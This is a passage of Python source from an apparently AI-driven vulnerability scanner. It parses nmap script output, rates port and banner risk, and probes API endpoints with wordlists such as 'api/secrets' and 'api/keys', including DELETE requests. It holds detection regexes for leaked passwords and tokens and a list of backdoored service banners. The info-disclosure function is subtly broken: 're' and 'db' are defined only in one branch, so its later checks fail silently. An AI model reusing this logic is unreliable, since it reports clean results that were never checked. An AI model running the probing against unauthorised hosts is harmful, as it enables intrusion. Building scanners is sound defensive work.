        vuln = create_vulnerability(
            vuln_type='Development Environment Exposure',
            severity='High',
            evidence=f'Development ports {detected_dev_ports} detected with {target_context.framework}',
            target=host,
            business_impact='Development environment may contain sensitive information',
            remediation='Remove development servers from production environment'
        )
        vulnerabilities.append(vuln)
    
    return vulnerabilities

def _assess_context_business_impact(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:    
    if not vulnerabilities:
        return "No significant security issues detected"
    
    high_impact_count = len([v for v in vulnerabilities if v.severity in ['Critical', 'High']])
    
    impact_factors = []
    
    if target_context.framework:
        impact_factors.append(f"Web application framework ({target_context.framework}) exposure")
    
    if target_context.database:
        impact_factors.append(f"Database service ({target_context.database}) accessibility")
    
    if target_context.cms:
        impact_factors.append(f"CMS platform ({target_context.cms}) vulnerabilities")
    
    if high_impact_count > 0:
        base_impact = f"High security risk: {high_impact_count} critical/high severity issues"
    else:
        base_impact = "Medium security risk: configuration and exposure issues detected"
    
    if impact_factors:
        return base_impact + ". Context factors: " + ", ".join(impact_factors)
    
    return base_impact

def _assess_context_compliance_risk(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    
    risks = []
    
    if target_context.database and any(v.severity in ['Critical', 'High'] for v in vulnerabilities):
        risks.append("Data protection regulations (GDPR, CCPA) at risk due to database exposure")
    
    if target_context.framework and 'ecommerce' in str(target_context.cms).lower():
        risks.append("PCI DSS compliance at risk for e-commerce platform")
    
    if target_context.has_waf and vulnerabilities:
        risks.append("WAF configuration may not be sufficient for regulatory compliance")
    
    if not risks:
        return "Low compliance risk"
    
    return "Compliance concerns: " + "; ".join(risks)

def _assess_port_risk_advanced(port: int, service: str = '', banner: str = '') -> str:
    """Advanced port risk assessment with service and banner analysis"""
    
    # Critical vulnerabilities based on service/banner analysis
    critical_patterns = [
        ('telnet', 'Critical'),  # Unencrypted protocol
        ('rsh', 'Critical'),     # Remote shell
        ('rlogin', 'Critical'),  # Remote login
        ('tftp', 'Critical'),    # Trivial FTP
        ('snmp', 'Critical'),    # Often misconfigured
        ('redis', 'Critical'),   # Often unauthenticated
    ]
    
    # High-risk services
    high_risk_services = {
        'ftp': 'FTP service - potential anonymous access',
        'ssh': 'SSH service - brute force target',
        'smtp': 'SMTP service - mail relay abuse potential',
        'mysql': 'MySQL database - unauthorized access risk',
        'mssql': 'MSSQL database - unauthorized access risk',
        'postgresql': 'PostgreSQL database - unauthorized access risk',
        'vnc': 'VNC service - remote access vulnerability',
        'rdp': 'RDP service - brute force and exploit target',
        'smb': 'SMB service - lateral movement risk'
    }
    
    # Banner-based vulnerability detection
    vulnerable_banners = [
        ('OpenSSH_7.4', 'High'),  # Known vulnerabilities
        ('vsftpd 2.3.4', 'Critical'),  # Backdoor
        ('ProFTPD 1.3.3c', 'Critical'),  # RCE vulnerability
        ('Apache/2.2', 'Medium'),  # Older version
        ('nginx/1.0', 'Medium'),   # Older version
        ('Microsoft-IIS/6.0', 'High'),  # End of life
    ]
    
    service_lower = service.lower()
    banner_lower = banner.lower()
    
    # Check critical patterns
    for pattern, risk in critical_patterns:
        if pattern in service_lower or pattern in banner_lower:
            return risk
    
    # Check vulnerable banners
    for banner_pattern, risk in vulnerable_banners:
        if banner_pattern.lower() in banner_lower:
            return risk
    
    # Check high-risk services
    if service_lower in high_risk_services:
        return 'High'
    
    # Port-based assessment (fallback)
    return _assess_port_risk(port)

def _identify_service_from_banner(banner: str, port: int) -> str:
    """Identify service from banner response"""
    banner_lower = banner.lower()
    
    service_patterns = {
        'ssh': ['ssh'],
        'ftp': ['ftp', '220'],
        'smtp': ['smtp', 'mail'],
        'http': ['http', 'server:'],
        'pop3': ['pop3', '+ok'],
        'imap': ['imap', '* ok'],
        'mysql': ['mysql'],
        'postgresql': ['postgresql'],
        'redis': ['redis'],
        'mongodb': ['mongodb'],
    }
    
    for service, patterns in service_patterns.items():
        if any(pattern in banner_lower for pattern in patterns):
            return service
    
    return 'unknown'

def _get_port_remediation(port: int, service: str) -> str:
    """Get specific remediation advice for port/service"""
    remediation_map = {
        21: "Disable FTP or use SFTP/FTPS with strong authentication",
        22: "Harden SSH: disable root login, use key auth, change default port",
        23: "Disable Telnet and use SSH instead",
        25: "Configure SMTP authentication and relay restrictions",
        53: "Secure DNS: disable recursion, use DNSSEC",
        135: "Disable RPC or restrict access via firewall",
        139: "Disable NetBIOS or restrict SMB access",
        161: "Secure SNMP: use SNMPv3, change default community strings",
        445: "Secure SMB: disable SMBv1, enable signing",
        1433: "Secure SQL Server: disable SA account, use Windows auth",
        3306: "Secure MySQL: remove anonymous accounts, use SSL",
        3389: "Secure RDP: enable NLA, use strong passwords, consider VPN",
        5432: "Secure PostgreSQL: configure pg_hba.conf, use SSL",
        5900: "Secure VNC: use strong passwords, consider SSH tunneling",
        6379: "Secure Redis: enable authentication, disable dangerous commands"
    }
    
    return remediation_map.get(port, f"Review necessity of {service} service and implement access controls")

# NSE Script parsers
def _parse_ssl_cert_script(output: str, host: str, port: str) -> List[Vulnerability]:
    """Parse SSL certificate script results"""
    vulnerabilities = []
    if 'expired' in output.lower() or 'self-signed' in output.lower():
        vuln = create_vulnerability(
            vuln_type='SSL Certificate Issue',
            severity='Medium',
            evidence=output[:200],
            target=host,
            port=port,
            tool='nmap_ssl',
            remediation='Install valid SSL certificate from trusted CA'
        )
        vulnerabilities.append(vuln)
    return vulnerabilities

def _parse_ssl_cipher_script(output: str, host: str, port: str) -> List[Vulnerability]:
    """Parse SSL cipher enumeration results"""
    vulnerabilities = []
    weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL']
    
    for cipher in weak_ciphers:
        if cipher in output:
            vuln = create_vulnerability(
                vuln_type='Weak SSL Cipher',
                severity='Medium',
                evidence=f'Weak cipher {cipher} supported',
                target=host,
                port=port,
                tool='nmap_ssl',
                remediation='Disable weak SSL/TLS ciphers and protocols'
            )
            vulnerabilities.append(vuln)
    return vulnerabilities

def _parse_security_headers_script(output: str, host: str, port: str) -> List[Vulnerability]:
    """Parse HTTP security headers results"""
    vulnerabilities = []
    missing_headers = []
    
    security_headers = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options', 
                       'Strict-Transport-Security', 'Content-Security-Policy']
    
    for header in security_headers:
        if header not in output:
            missing_headers.append(header)
    
    if missing_headers:
        vuln = create_vulnerability(
            vuln_type='Missing Security Headers',
            severity='Low',
            evidence=f'Missing headers: {", ".join(missing_headers)}',
            target=host,
            port=port,
            tool='nmap_http',
            remediation='Implement missing HTTP security headers'
        )
        vulnerabilities.append(vuln)
    
    return vulnerabilities

def _parse_ssh_hostkey_script(output: str, host: str, port: str) -> List[Vulnerability]:
    """Parse SSH host key results"""
    vulnerabilities = []
    if 'weak' in output.lower() or '1024' in output:
        vuln = create_vulnerability(
            vuln_type='Weak SSH Host Key',
            severity='Medium',
            evidence='Weak SSH host key detected',
            target=host,
            port=port,
            tool='nmap_ssh',
            remediation='Generate new SSH host keys with stronger algorithms'
        )
        vulnerabilities.append(vuln)
    return vulnerabilities

def _parse_vuln_script(output: str, host: str, port: str) -> List[Vulnerability]:
    """Parse vulnerability script results"""
    vulnerabilities = []
    if 'vulnerable' in output.lower():
        vuln = create_vulnerability(
            vuln_type='NSE Vulnerability Detection',
            severity='High',
            evidence=output[:300],
            target=host,
            port=port,
            tool='nmap_vuln',
            remediation='Apply security patches and updates'
        )
        vulnerabilities.append(vuln)
    return vulnerabilities

def _parse_smb_vuln_script(output: str, host: str, port: str) -> List[Vulnerability]:
    """Parse SMB vulnerability results"""
    vulnerabilities = []
    smb_vulns = ['MS17-010', 'MS08-067', 'CVE-2017-0143']
    
    for vuln_id in smb_vulns:
        if vuln_id in output:
            vuln = create_vulnerability(
                vuln_type='SMB Vulnerability',
                severity='Critical',
                evidence=f'{vuln_id} vulnerability detected',
                target=host,
                port=port,
                tool='nmap_smb',
                remediation='Apply Microsoft security patches immediately'
            )
            vulnerabilities.append(vuln)
    return vulnerabilities

def _parse_ftp_anon_script(output: str, host: str, port: str) -> List[Vulnerability]:
    """Parse FTP anonymous login results"""
    vulnerabilities = []
    if 'anonymous' in output.lower() and 'login' in output.lower():
        vuln = create_vulnerability(
            vuln_type='FTP Anonymous Access',
            severity='Medium',
            evidence='Anonymous FTP login enabled',
            target=host,
            port=port,
            tool='nmap_ftp',
            remediation='Disable anonymous FTP access'
        )
        vulnerabilities.append(vuln)
    return vulnerabilities

# ===== API SECURITY TESTING FUNCTIONS =====

def api_endpoint_discovery(base_url: str, wordlist: List[str] = None, 
                          target_context: Union[PayloadTargetContext, Dict[str, Any]] = None,
                          discovery_mode: str = "comprehensive", http_methods: List[str] = None,
                          custom_headers: Dict[str, str] = None) -> ToolCallResult:

    start_time = time.time()
    vulnerabilities = []
    discovered_endpoints = []
    
    try:
        session = create_session()
        
        # Convert target_context to PayloadTargetContext if it's a dict
        if isinstance(target_context, dict):
            target_context = PayloadTargetContext.from_dict(target_context)
        elif target_context is None:
            target_context = PayloadTargetContext()
        
        # Use LLM-provided wordlist or intelligent generation
        if not wordlist:
            wordlist = _generate_api_wordlist(discovery_mode, target_context)
        
        # Use LLM-provided HTTP methods or context-aware selection
        if not http_methods:
            http_methods = _get_http_methods(discovery_mode, target_context)
        
        # Setup authentication and custom headers
        if custom_headers:
            session.headers.update(custom_headers)
        
        session = _setup_api_authentication(session, target_context)
        
        base_url = base_url.rstrip('/')
        
        # Test endpoints with context-aware approach
        for endpoint in wordlist:
            for method in http_methods:
                try:
                    test_url = f"{base_url}/{endpoint.lstrip('/')}"
                    
                    # Context-aware request execution
                    response = _execute_api_request(
                        session, test_url, method, target_context
                    )
                    
                    if response is None:
                        continue
                    
                    # Enhanced discovery criteria based on context
                    discovery_status_codes = _get_discovery_status_codes(target_context)
                    
                    if response.status_code in discovery_status_codes:
                        endpoint_info = {
                            'url': test_url,
                            'method': method,
                            'status_code': response.status_code,
                            'content_type': response.headers.get('content-type', ''),
                            'content_length': len(response.text),
                            'headers': dict(response.headers),
                            'framework_hints': _detect_framework_hints(response, target_context),
                            'api_version_hints': _detect_api_version_hints(response, test_url)
                        }
                        discovered_endpoints.append(endpoint_info)
                        
                        # Context-aware vulnerability analysis
                        vulns = _analyze_api_response(
                            response, test_url, method, target_context
                        )
                        vulnerabilities.extend(vulns)
                    
                    # Context-aware rate limiting
                    sleep_time = _get_api_delay(discovery_mode, target_context)
                    time.sleep(sleep_time)
                    
                except Exception as e:
                    logging.error(f"Error testing endpoint {endpoint} with {method}: {e}")
        
        # Post-discovery analysis
        additional_vulns = _perform_post_discovery_analysis(
            discovered_endpoints, target_context, session
        )
        vulnerabilities.extend(additional_vulns)
        
        execution_time = time.time() - start_time
        
        # Calculate business impact
        business_impact = _assess_api_discovery_business_impact(
            discovered_endpoints, vulnerabilities, target_context
        )
        
        # Calculate compliance risk
        compliance_risk = _assess_api_discovery_compliance_risk(
            vulnerabilities, target_context
        )
        
        return ToolCallResult(
            success=True,
            tool_name="API Endpoint Discovery",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'base_url': base_url,
                'discovery_mode': discovery_mode,
                'endpoints_tested': len(wordlist) * len(http_methods),
                'endpoints_discovered': len(discovered_endpoints),
                'discovered_endpoints': discovered_endpoints,
                'methods_tested': http_methods,
                'framework_detected': target_context.framework,
                'authentication_type': target_context.authentication_type,
                'waf_detected': target_context.has_waf,
                'context_optimizations': _get_applied_optimizations(target_context)
            },
            business_impact=business_impact,
            compliance_risk=compliance_risk,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0])
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="API Endpoint Discovery",
            error=str(e),
            execution_time=time.time() - start_time
        )



def _generate_api_wordlist(discovery_mode: str, target_context: PayloadTargetContext) -> List[str]:
    """Generate context-aware API wordlist using PayloadLibrary and target intelligence"""
    
    # Start with PayloadLibrary API endpoints
    base_endpoints = PayloadLibrary.API_SECURITY_PAYLOADS.get('api_versioning', [])
    
    # Framework-specific endpoints
    framework_endpoints = []
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework in ['django', 'flask', 'fastapi']:
            framework_endpoints.extend([
                'api/v1/', 'api/v2/', 'api/', 'rest/', 
                'api/admin/', 'api/users/', 'api/auth/',
                'api/docs/', 'api/schema/', 'api/openapi.json'
            ])
        elif framework in ['rails', 'sinatra']:
            framework_endpoints.extend([
                'api/v1/', 'api/v2/', 'rails/api/',
                'api/users.json', 'api/auth.json',
                'api/admin.json'
            ])
        elif framework in ['express', 'nodejs']:
            framework_endpoints.extend([
                'api/v1/', 'api/v2/', 'api/', 'rest/',
                'graphql/', 'api/graphql/',
                'api/users', 'api/auth'
            ])
        elif framework in ['laravel', 'symfony']:
            framework_endpoints.extend([
                'api/v1/', 'api/v2/', 'api/', 
                'laravel/api/', 'api/users',
                'api/auth', 'api/admin'
            ])
        elif framework in ['asp.net', 'dotnet']:
            framework_endpoints.extend([
                'api/v1/', 'api/v2/', 'api/',
                'api/users', 'api/auth',
                'api/values', 'api/weatherforecast'
            ])
    
    # CMS-specific endpoints  
    cms_endpoints = []
    if target_context.cms:
        cms = target_context.cms.lower()
        if cms == 'wordpress':
            cms_endpoints.extend([
                'wp-json/wp/v2/', 'wp-json/api/v1/',
                'wp-json/wp/v2/users', 'wp-json/wp/v2/posts',
                'wp-admin/admin-ajax.php'
            ])
        elif cms == 'drupal':
            cms_endpoints.extend([
                'api/v1/', 'drupal/api/',
                'rest/session/token', 'jsonapi/',
                'admin/config/services/rest'
            ])
        elif cms == 'joomla':
            cms_endpoints.extend([
                'api/index.php/v1/', 'joomla/api/',
                'api/v1/users', 'administrator/index.php'
            ])
    
    # Database-specific API endpoints
    db_endpoints = []
    if target_context.database:
        db = target_context.database.lower()
        if db in ['mongodb', 'nosql']:
            db_endpoints.extend([
                'api/collections/', 'api/documents/',
                'api/aggregation/', 'admin/'
            ])
        elif db in ['mysql', 'postgresql']:
            db_endpoints.extend([
                'api/query/', 'api/tables/',
                'api/admin/', 'api/backup/'
            ])
    
    # Combine based on discovery mode
    all_endpoints = base_endpoints + framework_endpoints + cms_endpoints + db_endpoints
    
    if discovery_mode == "basic":
        return all_endpoints[:20]  # Limit for basic mode
    elif discovery_mode == "comprehensive":
        return all_endpoints + _get_common_api_patterns()
    else:  # aggressive or stealth
        return all_endpoints + _get_common_api_patterns() + _get_extended_api_patterns()

def _get_common_api_patterns() -> List[str]:
    """Common API endpoint patterns"""
    return [
        'api/health', 'api/status', 'api/version', 'api/info',
        'api/config', 'api/settings', 'api/metrics',
        'api/users', 'api/auth', 'api/login', 'api/logout',
        'api/admin', 'api/dashboard', 'api/reports',
        'docs/', 'swagger/', 'openapi.json', 'swagger.json',
        'graphql/', 'api/graphql/', 'graphiql/',
        'api/v1/health', 'api/v1/status', 'api/v1/info'
    ]

def _get_extended_api_patterns() -> List[str]:
    """Extended API patterns for aggressive discovery"""
    patterns = []
    
    # Generate versioned endpoints
    resources = ['users', 'orders', 'products', 'customers', 'accounts', 'files']
    versions = ['v1', 'v2', 'v3', 'v4']
    
    for resource in resources:
        for version in versions:
            patterns.extend([
                f'api/{version}/{resource}',
                f'{version}/api/{resource}',
                f'rest/{version}/{resource}',
                f'api/{resource}'
            ])
    
    # Add security-sensitive endpoints
    patterns.extend([
        'api/keys', 'api/secrets', 'api/tokens',
        'api/permissions', 'api/roles', 'api/access',
        'api/debug', 'api/test', 'api/dev',
        'api/backup', 'api/restore', 'api/export'
    ])
    
    return patterns

def _get_http_methods(discovery_mode: str, target_context: PayloadTargetContext) -> List[str]:
    """Generate context-aware HTTP methods to test"""
    
    methods = ['GET']  # Always include GET
    
    if target_context.supports_post:
        methods.append('POST')
    
    if discovery_mode in ['comprehensive', 'aggressive']:
        methods.extend(['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
    
    # Framework-specific method additions
    if target_context.framework:
        framework = target_context.framework.lower()
        if 'rest' in framework or 'api' in framework:
            methods.extend(['PUT', 'DELETE', 'PATCH'])
    
    # Remove duplicates while preserving order
    seen = set()
    return [m for m in methods if not (m in seen or seen.add(m))]

def _setup_api_authentication(session: requests.Session, target_context: PayloadTargetContext) -> requests.Session:
    """Setup authentication based on target context"""
    
    if target_context.authentication_type:
        auth_type = target_context.authentication_type.lower()
        
        if auth_type == 'bearer' and target_context.custom_headers:
            # Bearer token already in custom headers
            pass
        elif auth_type == 'basic':
            # Add basic auth attempt (should be provided via custom_headers)
            pass
        elif auth_type == 'cookie':
            # Cookie-based auth already in session
            pass
    
    # Add standard API headers
    session.headers.update({
        'Accept': 'application/json, application/xml, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (compatible; Security Scanner)',
        'Content-Type': 'application/json'
    })
    
    return session

def _execute_api_request(session: requests.Session, url: str, 
                                     method: str, target_context: PayloadTargetContext) -> requests.Response:
    """Execute HTTP request with context-aware optimizations"""
    
    try:
        timeout = 15 if target_context.has_waf else 10
        
        # Prepare request data based on context
        json_data = None
        if method in ['POST', 'PUT', 'PATCH'] and target_context.supports_json:
            json_data = {}
        
        # Execute request
        if method == 'GET':
            response = session.get(url, timeout=timeout)
        elif method == 'POST':
            response = session.post(url, json=json_data, timeout=timeout)
        elif method == 'PUT':
            response = session.put(url, json=json_data, timeout=timeout)
        elif method == 'DELETE':
            response = session.delete(url, timeout=timeout)
        elif method == 'PATCH':
            response = session.patch(url, json=json_data, timeout=timeout)
        elif method == 'OPTIONS':
            response = session.options(url, timeout=timeout)
        elif method == 'HEAD':
            response = session.head(url, timeout=timeout)
        else:
            return None
            
        return response
        
    except Exception as e:
        logging.debug(f"Request failed for {method} {url}: {e}")
        return None

def _get_discovery_status_codes(target_context: PayloadTargetContext) -> List[int]:
    """Get status codes that indicate endpoint discovery based on context"""
    
    # Base discovery codes
    codes = [200, 201, 204, 301, 302, 400, 401, 403, 405, 422, 500]
    
    # Framework-specific additions
    if target_context.framework:
        framework = target_context.framework.lower()
        if 'django' in framework:
            codes.extend([404])  # Django may return 404 for valid endpoints
        elif 'rails' in framework:
            codes.extend([406])  # Rails content negotiation
    
    return codes

def _detect_framework_hints(response: requests.Response, target_context: PayloadTargetContext) -> Dict[str, str]:
    """Detect framework hints from response"""
    
    hints = {}
    
    # Check headers for framework signatures
    for header, value in response.headers.items():
        header_lower = header.lower()
        value_lower = str(value).lower()
        
        if 'server' in header_lower:
            hints['server'] = value
        elif 'x-powered-by' in header_lower:
            hints['powered_by'] = value
        elif 'django' in value_lower:
            hints['framework'] = 'Django'
        elif 'rails' in value_lower:
            hints['framework'] = 'Rails'
        elif 'express' in value_lower:
            hints['framework'] = 'Express'
        elif 'laravel' in value_lower:
            hints['framework'] = 'Laravel'
    
    return hints

def _detect_api_version_hints(response: requests.Response, url: str) -> Dict[str, str]:
    """Detect API versioning patterns"""
    
    hints = {}
    
    # Extract version from URL
    import re
    version_pattern = r'/v(\d+)(?:\.(\d+))?/'
    match = re.search(version_pattern, url)
    if match:
        hints['url_version'] = match.group(0)
    
    # Check response for version indicators
    try:
        if 'application/json' in response.headers.get('content-type', ''):
            data = response.json()
            if isinstance(data, dict):
                if 'version' in data:
                    hints['response_version'] = str(data['version'])
                elif 'api_version' in data:
                    hints['response_version'] = str(data['api_version'])
    except:
        pass
    
    return hints

def _analyze_api_response(response: requests.Response, url: str, 
                                      method: str, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Enhanced API response analysis with context awareness"""
    
    vulnerabilities = []
    
    try:
        response_text = response.text.lower()
        content_type = response.headers.get('content-type', '').lower()
        
        # 1. Framework-specific vulnerability detection
        if target_context.framework:
            framework_vulns = _detect_framework_specific_api_issues(
                response, url, method, target_context.framework
            )
            vulnerabilities.extend(framework_vulns)
        
        # 2. Authentication and authorization analysis
        auth_vulns = _analyze_api_authentication_issues(
            response, url, method, target_context
        )
        vulnerabilities.extend(auth_vulns)
        
        # 3. Information disclosure with context
        info_vulns = _detect_context_aware_info_disclosure(
            response, url, method, target_context
        )
        vulnerabilities.extend(info_vulns)
        
        # 4. API-specific security headers analysis
        header_vulns = _analyze_api_security_headers(
            response, url, target_context
        )
        vulnerabilities.extend(header_vulns)
        
        # 5. GraphQL-specific analysis
        if 'graphql' in url.lower() or 'graphql' in content_type:
            graphql_vulns = _analyze_graphql_security_issues(
                response, url, method
            )
            vulnerabilities.extend(graphql_vulns)
        
        # 6. WAF detection and bypass analysis
        if target_context.has_waf:
            waf_vulns = _analyze_waf_bypass_opportunities(
                response, url, method
            )
            vulnerabilities.extend(waf_vulns)
    
    except Exception as e:
        logging.error(f"Error in context-aware API analysis: {e}")
    
    return vulnerabilities

def _detect_framework_specific_api_issues(response: requests.Response, url: str, 
                                         method: str, framework: str) -> List[Vulnerability]:
    """Detect framework-specific API security issues"""
    
    vulnerabilities = []
    framework_lower = framework.lower()
    
    try:
        if 'django' in framework_lower:
            # Django REST Framework specific checks
            if 'browsableapirenderer' in response.text.lower():
                vuln = create_vulnerability(
                    vuln_type='Django REST Framework Debug Interface',
                    severity='Medium',
                    evidence='Browsable API interface exposed in production',
                    url=url,
                    technique='Framework fingerprinting',
                    remediation='Disable BrowsableAPIRenderer in production settings'
                )
                vulnerabilities.append(vuln)
        
        elif 'rails' in framework_lower:
            # Rails API specific checks
            if response.status_code == 422 and 'json' in response.headers.get('content-type', ''):
                try:
                    data = response.json()
                    if 'errors' in data and isinstance(data['errors'], dict):
                        vuln = create_vulnerability(
                            vuln_type='Rails API Validation Error Disclosure',
                            severity='Low',
                            evidence='Detailed validation errors exposed',
                            url=url,
                            technique='Error analysis',
                            remediation='Sanitize validation error messages'
                        )
                        vulnerabilities.append(vuln)
                except:
                    pass
        
        elif 'express' in framework_lower or 'nodejs' in framework_lower:
            # Express.js specific checks
            if 'x-powered-by' in response.headers:
                powered_by = response.headers['x-powered-by'].lower()
                if 'express' in powered_by:
                    vuln = create_vulnerability(
                        vuln_type='Express.js Version Disclosure',
                        severity='Info',
                        evidence=f'Express version disclosed: {response.headers["x-powered-by"]}',
                        url=url,
                        technique='Header analysis',
                        remediation='Remove X-Powered-By header using app.disable("x-powered-by")'
                    )
                    vulnerabilities.append(vuln)
    
    except Exception as e:
        logging.debug(f"Framework analysis error: {e}")
    
    return vulnerabilities

def _analyze_api_authentication_issues(response: requests.Response, url: str, 
                                      method: str, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Analyze API authentication and authorization issues"""
    
    vulnerabilities = []
    
    try:
        # Check for missing authentication on sensitive endpoints
        sensitive_patterns = ['admin', 'user', 'config', 'secret', 'key', 'token']
        
        if any(pattern in url.lower() for pattern in sensitive_patterns):
            if response.status_code == 200:
                # Successful access to sensitive endpoint without auth
                vuln = create_vulnerability(
                    vuln_type='Unauthenticated Access to Sensitive API',
                    severity='High',
                    evidence=f'Sensitive API endpoint accessible without authentication',
                    url=url,
                    technique='Authentication bypass',
                    business_impact='Unauthorized access to sensitive functionality',
                    remediation='Implement proper authentication and authorization'
                )
                vulnerabilities.append(vuln)
        
        # Check for improper CORS configuration
        if 'access-control-allow-origin' in response.headers:
            cors_origin = response.headers['access-control-allow-origin']
            if cors_origin == '*':
                vuln = create_vulnerability(
                    vuln_type='Permissive CORS Configuration',
                    severity='Medium',
                    evidence='CORS policy allows requests from any origin (*)',
                    url=url,
                    technique='Header analysis',
                    business_impact='Cross-origin attacks possible',
                    remediation='Configure specific allowed origins for CORS'
                )
                vulnerabilities.append(vuln)
        
        # Check for JWT-related issues
        auth_header = response.headers.get('authorization', '')
        if 'bearer' in auth_header.lower():
            # Potential JWT in response (unusual but possible)
            vuln = create_vulnerability(
                vuln_type='JWT Token in Response Headers',
                severity='Medium',
                evidence='JWT token found in response authorization header',
                url=url,
                technique='Header analysis',
                remediation='Avoid exposing JWT tokens in response headers'
            )
            vulnerabilities.append(vuln)
    
    except Exception as e:
        logging.debug(f"Authentication analysis error: {e}")
    
    return vulnerabilities

def _detect_context_aware_info_disclosure(response: requests.Response, url: str, 
                                         method: str, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Context-aware information disclosure detection"""
    
    vulnerabilities = []
    
    try:
        response_text = response.text.lower()
        
        # Database-specific information disclosure
        if target_context.database:
            db = target_context.database.lower()
            db_patterns = {
                'mysql': [r'mysql.*error', r'table.*doesn.*exist', r'column.*unknown'],
                'postgresql': [r'postgresql.*error', r'relation.*does not exist', r'syntax error at'],
                'mongodb': [r'mongodb.*error', r'collection.*not found', r'bson'],
                'redis': [r'redis.*error', r'wrongtype.*operation', r'noauth.*authentication']
            }
            
            import re
            patterns = db_patterns.get(db, [])
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    vuln = create_vulnerability(
                        vuln_type=f'{db.title()} Database Error Disclosure',
                        severity='Medium',
                        evidence=f'Database error pattern detected: {pattern}',
                        url=url,
                        technique='Error analysis',
                        business_impact='Database schema and error information leaked',
                        remediation='Implement proper error handling and logging'
                    )
                    vulnerabilities.append(vuln)
        
        # Framework-specific information disclosure
        if target_context.framework:
            framework_lower = target_context.framework.lower()
            if 'django' in framework_lower and 'traceback' in response_text:
                vuln = create_vulnerability(
                    vuln_type='Django Debug Information Disclosure',
                    severity='High',
                    evidence='Django traceback information exposed',
                    url=url,
                    technique='Framework fingerprinting',
                    business_impact='Application structure and sensitive paths revealed',
                    remediation='Set DEBUG = False in Django settings'
                )
                vulnerabilities.append(vuln)
            
            elif 'rails' in framework_lower and 'routing error' in response_text:
                vuln = create_vulnerability(
                    vuln_type='Rails Routing Error Disclosure',
                    severity='Medium',
                    evidence='Rails routing information exposed',
                    url=url,
                    technique='Framework fingerprinting',
                    remediation='Configure proper error pages in Rails'
                )
                vulnerabilities.append(vuln)
        
        # API-specific information disclosure patterns
        api_patterns = [
            (r'api.*key', 'API Key Disclosure', 'High'),
            (r'secret.*[=:].*[a-zA-Z0-9]{20,}', 'Secret Token Disclosure', 'Critical'),
            (r'password.*[=:].*[^\s]{6,}', 'Password Disclosure', 'Critical'),
            (r'jwt.*[=:].*eyJ[a-zA-Z0-9]', 'JWT Token Disclosure', 'High'),
            (r'bearer.*[a-zA-Z0-9]{20,}', 'Bearer Token Disclosure', 'High')
        ]
        
        for pattern, vuln_type, severity in api_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                vuln = create_vulnerability(
                    vuln_type=vuln_type,
                    severity=severity,
                    evidence=f'Sensitive information pattern detected in response',
                    url=url,
                    technique='Pattern analysis',
                    business_impact='Sensitive credentials exposed',
                    remediation='Remove sensitive information from API responses'
                )
                vulnerabilities.append(vuln)
            
            if db in db_patterns:
                for pattern in db_patterns[db]:
                    if re.search(pattern, response_text):
                        vuln = create_vulnerability(
                            vuln_type=f'{db.title()} Database Error Disclosure',
                            severity='Medium',
                            evidence=f'Database error message exposed in API response',
                            url=url,
                            technique='Error analysis',
                            business_impact='Technical information leakage',
                            remediation='Implement generic error messages'
                        )
                        vulnerabilities.append(vuln)
                        break
        
        # Framework-specific sensitive data patterns
        if target_context.framework:
            framework = target_context.framework.lower()
            if 'django' in framework:
                django_patterns = [r'django.*error', r'traceback.*recent call', r'debug.*true']
                for pattern in django_patterns:
                    if re.search(pattern, response_text):
                        vuln = create_vulnerability(
                            vuln_type='Django Debug Information Disclosure',
                            severity='High',
                            evidence='Django debug information exposed in API response',
                            url=url,
                            technique='Error analysis',
                            business_impact='Application internals exposed',
                            remediation='Set DEBUG=False in production'
                        )
                        vulnerabilities.append(vuln)
                        break
    
    except Exception as e:
        logging.debug(f"Info disclosure analysis error: {e}")
    
    return vulnerabilities

def _analyze_api_security_headers(response: requests.Response, url: str, 
                                target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Analyze API-specific security headers"""
    
    vulnerabilities = []
    
    # API-specific security headers
    missing_headers = []
    for header in ['x-content-type-options', 'x-frame-options']:
        if header not in response.headers:
            missing_headers.append(header)
    
    if missing_headers:
        vuln = create_vulnerability(
            vuln_type='Missing API Security Headers',
            severity='Low',
            evidence=f'Missing security headers: {", ".join(missing_headers)}',
            url=url,
            technique='Header analysis',
            remediation='Implement comprehensive security headers for API endpoints'
        )
        vulnerabilities.append(vuln)
    
    # Check for version disclosure in headers
    version_headers = ['x-api-version', 'api-version', 'version']
    for header in version_headers:
        if header in response.headers:
            vuln = create_vulnerability(
                vuln_type='API Version Disclosure',
                severity='Info',
                evidence=f'API version disclosed in {header} header: {response.headers[header]}',
                url=url,
                technique='Header analysis',
                remediation='Consider removing version information from headers'
            )
            vulnerabilities.append(vuln)
    
    return vulnerabilities

def _analyze_graphql_security_issues(response: requests.Response, url: str, method: str) -> List[Vulnerability]:
    """Analyze GraphQL-specific security issues"""
    
    vulnerabilities = []
    
    try:
        if method == 'GET' and response.status_code == 200:
            # GraphQL introspection may be enabled
            if 'graphiql' in response.text.lower() or 'graphql playground' in response.text.lower():
                vuln = create_vulnerability(
                    vuln_type='GraphQL Introspection Interface Exposed',
                    severity='Medium',
                    evidence='GraphQL development interface accessible',
                    url=url,
                    technique='Interface discovery',
                    business_impact='Schema information exposed',
                    remediation='Disable GraphQL development interfaces in production'
                )
                vulnerabilities.append(vuln)
        
        # Check for introspection query support
        if method == 'POST' and 'application/json' in response.headers.get('content-type', ''):
            try:
                data = response.json()
                if 'data' in data and '__schema' in str(data):
                    vuln = create_vulnerability(
                        vuln_type='GraphQL Schema Introspection Enabled',
                        severity='Medium',
                        evidence='GraphQL schema introspection is enabled',
                        url=url,
                        technique='Introspection query',
                        business_impact='Complete API schema exposed',
                        remediation='Disable introspection in production GraphQL endpoints'
                    )
                    vulnerabilities.append(vuln)
            except:
                pass
    
    except Exception as e:
        logging.debug(f"GraphQL analysis error: {e}")
    
